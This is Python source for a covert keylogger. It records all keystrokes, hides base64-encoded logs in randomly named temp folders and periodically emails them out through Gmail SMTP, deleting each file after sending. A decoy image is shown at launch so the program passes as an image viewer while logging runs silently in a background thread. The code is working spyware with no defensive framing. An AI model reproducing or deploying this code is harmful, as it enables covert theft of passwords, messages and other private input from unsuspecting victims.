import sys, os, threading, time, random, base64
from pynput import keyboard

db = ""
def h_evt(e):
    global db
    try:
        db += e.char
    except: db += "[" + str(e) + "]"

def c_rf():
    p = os.getenv('TEMP')
    for _ in range(random.randint(2,4)):
        p = os.path.join(p, str(random.randint(1000,9999)))
        os.makedirs(p, exist_ok=True)
    return os.path.join(p, f"{random.randint(100,999)}.dat")

def w_lf():
    lf = c_rf()
    with open(lf, "w") as f:
        b = base64.b64encode(db.encode()).decode()
        f.write(b)
    return lf

def tx(lf):
    try:
        import smtplib
        from email.mime.text import MIMEText
        from email.mime.multipart import MIMEMultipart
        from email.mime.base import MIMEBase
        import email.encoders as encoders

        s, r, pw = "", "", ""
        msg = MIMEMultipart()
        msg["Subject"] = "Report"
        msg["From"] = s
        msg["To"] = r
        with open(lf, "rb") as a:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(a.read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(lf)}")
            msg.attach(part)
        msg.attach(MIMEText("Attachment inside", "plain"))
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as c:
            c.login(s, pw)
            c.sendmail(s, r, msg.as_string())
        os.remove(lf)
    except: pass

def mon():
    global db
    listener = keyboard.Listener(on_press=h_evt)
    listener.start()
    while True:
        time.sleep(200 + random.randint(0, 250))
        if db:
            lf = w_lf()
            tx(lf)
            db = ""

if __name__ == "__main__":
    # Show image briefly (replace 'walpaper.jpg' with your actual image)
    try:
        from PIL import Image
        bundle_dir = getattr(sys, 'frozen', False) and sys._MEIPASS or os.path.dirname(os.path.abspath(__file__))
        ipath = os.path.join(bundle_dir, "walpaper.jpg")
        Image.open(ipath).show()
    except: pass
    threading.Thread(target=mon, daemon=True).start()
    while True: time.sleep(1)
